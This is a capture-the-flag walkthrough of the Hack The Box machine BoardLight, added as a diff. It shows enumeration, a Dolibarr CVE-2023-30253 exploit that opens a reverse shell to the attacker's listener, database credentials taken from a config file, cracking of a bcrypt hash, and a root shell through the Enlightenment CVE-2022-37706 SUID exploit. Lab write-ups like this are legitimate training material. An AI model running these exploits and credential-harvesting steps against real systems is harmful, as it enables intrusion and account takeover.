@@ -1,0 +1,337 @@
+---
+title: BoardLight
+banner: /avatars/board-light.webp
+difficulty: easy
+os: linux
+releaseDate: 2024-05-11
+pwnDate: 2024-05-30
+slug: "board-light"
+achievement: https://www.hackthebox.com/achievement/machine/701907/603
+---
+
+import Browser from "@/components/Browser.astro" 
+
+## Enumeration
+
+```bash
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping 10.10.11.11 -oG allPorts
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+```
+
+```bash
+sudo nmap -p22,80 -sCV 10.10.11.11 -oN targeted
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
+|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
+|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Site doesn t have a title (text/html; charset=UTF-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+<Browser
+  url="10.10.11.11"
+  src="/walkthroughs/board-light/0.png"
+/>
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u "http://10.10.11.11/FUZZ" 
+
+.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 47ms]
+.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 47ms]
+.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 55ms]
+css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 49ms]
+images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 52ms]
+index.php               [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 47ms]
+js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 50ms]
+server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 50ms]
+```
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://board.htb -H "Host: FUZZ.board.htb" -fs 15949
+
+crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 117ms]
+```
+
+```bash
+sudo sh -c 'echo "10.10.11.11 board.htb crm.board.htb" >> /etc/hosts'
+```
+
+<Browser
+  url="crm.board.htb"
+  src="/walkthroughs/board-light/1.png"
+/>
+
+## Exploitation
+
+[poc](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)
+
+```bash
+python3 exploit.py -h                                        
+usage: python3 exploit.py <TARGET_HOSTNAME> <USERNAME> <PASSWORD> <LHOST> <LPORT>
+example: python3 exploit.py http://example.com login password 127.0.0.1 9001
+
+---[Reverse Shell Exploit for Dolibarr <= 17.0.0 (CVE-2023-30253)]---
+
+positional arguments:
+  hostname    Target hostname
+  username    Username of Dolibarr ERP/CRM
+  password    Password of Dolibarr ERP/CRM
+  lhost       Listening host for reverse shell
+  lport       Listening port for reverse shell
+
+options:
+  -h, --help  show this help message and exit
+```
+
+```bash
+nc -lvnp 5000
+```
+
+```bash
+python3 exploit.py http://crm.board.htb admin admin 10.10.14.10 5000
+[*] Trying authentication...
+[**] Login: admin
+[**] Password: admin
+[*] Trying created site...
+[*] Trying created page...
+[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
+```
+
+```bash
+nc -lvnp 5000
+listening on [any] 5000 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.11.11] 60282
+bash: cannot set terminal process group (866): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
+```
+
+## Post Exploitation
+
+```bash
+www-data@boardlight:/home$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+```bash
+www-data@boardlight:/home$ ls /home
+larissa
+```
+
+```bash
+www-data@boardlight:~/html/crm.board.htb$ grep -ril "pass" ./ | grep "conf" 
+
+./nightwatch.conf.js
+./htdocs/includes/ace/src/mode-apache_conf.js
+./htdocs/includes/webklex/php-imap/src/config/imap.php
+./htdocs/core/class/conf.class.php
+./htdocs/install/fileconf.php
+./htdocs/conf/conf.php.old
+./htdocs/conf/conf.php.example
+./htdocs/conf/conf.php
+./htdocs/eventorganization/class/conferenceorbooth.class.php
+./htdocs/eventorganization/class/conferenceorboothattendee.class.php
+```
+
+```bash
+www-data@boardlight:~/html/crm.board.htb$ cat ./htdocs/conf/conf.php
+
+<...SNIP...>
+$dolibarr_main_url_root='http://crm.board.htb';
+$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
+$dolibarr_main_url_root_alt='/custom';
+$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
+$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
+$dolibarr_main_db_host='localhost';
+$dolibarr_main_db_port='3306';
+$dolibarr_main_db_name='dolibarr';
+$dolibarr_main_db_prefix='llx_';
+$dolibarr_main_db_user='dolibarrowner';
+$dolibarr_main_db_pass='serverfun2$2023!!';
+$dolibarr_main_db_type='mysqli';
+$dolibarr_main_db_character_set='utf8';
+$dolibarr_main_db_collation='utf8_unicode_ci';
+$dolibarr_main_authentication='dolibarr';
+$dolibarr_main_prod='0';
+$dolibarr_main_force_https='0';
+$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
+$dolibarr_nocsrfcheck='0';
+$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
+$dolibarr_mailing_limit_sendbyweb='0';
+$dolibarr_mailing_limit_sendbycli='0';
+<...SNIP...>
+```
+
+```bash
+mysql -u dolibarrowner -p dolibarr
+Enter password: serverfun2$2023!!
+```
+
+```bash
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| dolibarr           |
+| information_schema |
+| performance_schema |
++--------------------+
+```
+
+```bash
+mysql> show tables;
++-------------------------------------------------------------+
+| Tables_in_dolibarr                                          |
++-------------------------------------------------------------+
+| llx_user                                                    |
+```
+
+```bash
+mysql> describe llx_user;
+```
+
+| Field                        | Type         | Null | Key | Default           | Extra                                         |
+|------------------------------|--------------|------|-----|-------------------|-----------------------------------------------|
+| rowid                        | int          | NO   | PRI | NULL              | auto_increment                                |
+| entity                       | int          | NO   |     | 1                 |                                               |
+| ref_employee                 | varchar(50)  | YES  |     | NULL              |                                               |
+| ref_ext                      | varchar(50)  | YES  |     | NULL              |                                               |
+| admin                        | smallint     | YES  |     | 0                 |                                               |
+| employee                     | tinyint      | YES  |     | 1                 |                                               |
+| fk_establishment             | int          | YES  |     | 0                 |                                               |
+| datec                        | datetime     | YES  |     | NULL              |                                               |
+| tms                          | timestamp    | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED on update CURRENT_TIMESTAMP |
+| fk_user_creat                | int          | YES  |     | NULL              |                                               |
+| fk_user_modif                | int          | YES  |     | NULL              |                                               |
+| login                        | varchar(50)  | NO   | MUL | NULL              |                                               |
+| pass_encoding                | varchar(24)  | YES  |     | NULL              |                                               |
+| pass                         | varchar(128) | YES  |     | NULL              |                                               |
+| pass_crypted                 | varchar(128) | YES  |     | NULL              |                                               |
+| pass_temp                    | varchar(128) | YES  |     | NULL              |                                               |
+| api_key                      | varchar(128) | YES  | UNI | NULL              |                                               |
+| gender                       | varchar(10)  | YES  |     | NULL              |                                               |
+| civility                     | varchar(6)   | YES  |     | NULL              |                                               |
+| lastname                     | varchar(50)  | YES  |     | NULL              |                                               |
+| firstname                    | varchar(50)  | YES  |     | NULL              |                                               |
+| address                      | varchar(255) | YES  |     | NULL              |                                               |
+| zip                          | varchar(25)  | YES  |     | NULL              |                                               |
+| town                         | varchar(50)  | YES  |     | NULL              |                                               |
+| fk_state                     | int          | YES  |     | 0                 |                                               |
+| fk_country                   | int          | YES  |     | 0                 |                                               |
+| birth                        | date         | YES  |     | NULL              |                                               |
+| birth_place                  | varchar(64)  | YES  |     | NULL              |                                               |
+| job                          | varchar(128) | YES  |     | NULL              |                                               |
+| office_phone                 | varchar(20)  | YES  |     | NULL              |                                               |
+| office_fax                   | varchar(20)  | YES  |     | NULL              |                                               |
+| user_mobile                  | varchar(20)  | YES  |     | NULL              |                                               |
+| personal_mobile              | varchar(20)  | YES  |     | NULL              |                                               |
+| email                        | varchar(255) | YES  |     | NULL              |                                               |
+| personal_email               | varchar(255) | YES  |     | NULL              |                                               |
+| signature                    | text         | YES  |     | NULL              |                                               |
+| socialnetworks               | text         | YES  |     | NULL              |                                               |
+| fk_soc                       | int          | YES  | MUL | NULL              |                                               |
+| fk_socpeople                 | int          | YES  | UNI | NULL              |                                               |
+| fk_member                    | int          | YES  | UNI | NULL              |                                               |
+| fk_user                      | int          | YES  |     | NULL              |                                               |
+| fk_user_expense_validator    | int          | YES  |     | NULL              |                                               |
+| fk_user_holiday_validator    | int          | YES  |     | NULL              |                                               |
+| idpers1                      | varchar(128) | YES  |     | NULL              |                                               |
+| idpers2                      | varchar(128) | YES  |     | NULL              |                                               |
+| idpers3                      | varchar(128) | YES  |     | NULL              |                                               |
+| note_public                  | text         | YES  |     | NULL              |                                               |
+| note_private                 | text         | YES  |     | NULL              |                                               |
+| model_pdf                    | varchar(255) | YES  |     | NULL              |                                               |
+| datelastlogin                | datetime     | YES  |     | NULL              |                                               |
+| datepreviouslogin            | datetime     | YES  |     | NULL              |                                               |
+| datelastpassvalidation       | datetime     | YES  |     | NULL              |                                               |
+| datestartvalidity            | datetime     | YES  |     | NULL              |                                               |
+| dateendvalidity              | datetime     | YES  |     | NULL              |                                               |
+| iplastlogin                  | varchar(250) | YES  |     | NULL              |                                               |
+| ippreviouslogin              | varchar(250) | YES  |     | NULL              |                                               |
+| egroupware_id                | int          | YES  |     | NULL              |                                               |
+| ldap_sid                     | varchar(255) | YES  |     | NULL              |                                               |
+| openid                       | varchar(255) | YES  |     | NULL              |                                               |
+| statut                       | tinyint      | YES  |     | 1                 |                                               |
+| photo                        | varchar(255) | YES  |     | NULL              |                                               |
+| lang                         | varchar(6)   | YES  |     | NULL              |                                               |
+| color                        | varchar(6)   | YES  |     | NULL              |                                               |
+| barcode                      | varchar(255) | YES  |     | NULL              |                                               |
+| fk_barcode_type              | int          | YES  |     | 0                 |                                               |
+| accountancy_code             | varchar(32)  | YES  |     | NULL              |                                               |
+| nb_holiday                   | int          | YES  |     | 0                 |                                               |
+| thm                          | double(24,8) | YES  |     | NULL              |                                               |
+| tjm                          | double(24,8) | YES  |     | NULL              |                                               |
+| salary                       | double(24,8) | YES  |     | NULL              |                                               |
+| salaryextra                  | double(24,8) | YES  |     | NULL              |                                               |
+| dateemployment               | date         | YES  |     | NULL              |                                               |
+| dateemploymentend            | date         | YES  |     | NULL              |                                               |
+| weeklyhours                  | double(16,8) | YES  |     | NULL              |                                               |
+| import_key                   | varchar(14)  | YES  |     | NULL              |                                               |
+| default_range                | int          | YES  |     | NULL              |                                               |
+| default_c_exp_tax_cat        | int          | YES  |     | NULL              |                                               |
+| national_registration_number | varchar(50)  | YES  |     | NULL              |                                               |
+| fk_warehouse                 | int          | YES  |     | NULL              |                                               |
+
+```bash
+mysql> select login, pass_crypted from llx_user;
++----------+--------------------------------------------------------------+
+| login    | pass_crypted                                                 |
++----------+--------------------------------------------------------------+
+| dolibarr | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm |
+| admin    | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 |
++----------+--------------------------------------------------------------+
+2 rows in set (0.00 sec)
+```
+
+```bash
+hashid hash.txt
+
+--File 'hash.txt'--
+Analyzing '$2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt 
+--End of file 'hash.txt'--
+```
+
+```bash
+hashcat -m 3200 -a 0 -d 1 hash.txt /usr/share/wordlists/rockyou.txt
+
+$2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96:admin
+```
+
+`larissa:serverfun2$2023!!`
+
+```bash
+larissa@boardlight:~$ cat user.txt 
+d3d52a4b2e7795a1a492352042889565
+```
+
+## Privilege Escalation
+
+![](/walkthroughs/board-light/2.png)
+
+https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit
+
+```bash
+larissa@boardlight:~$ ./poc.sh 
+CVE-2022-37706
+[*] Trying to find the vulnerable SUID file...
+[*] This may take few seconds...
+[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+[+] Enjoy the root shell :)
+mount: /dev/../tmp/: can't find in /etc/fstab.
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
+# cat /root/root.txt
+0874c2c63ac85bd4f81c12dc8748de78
+```
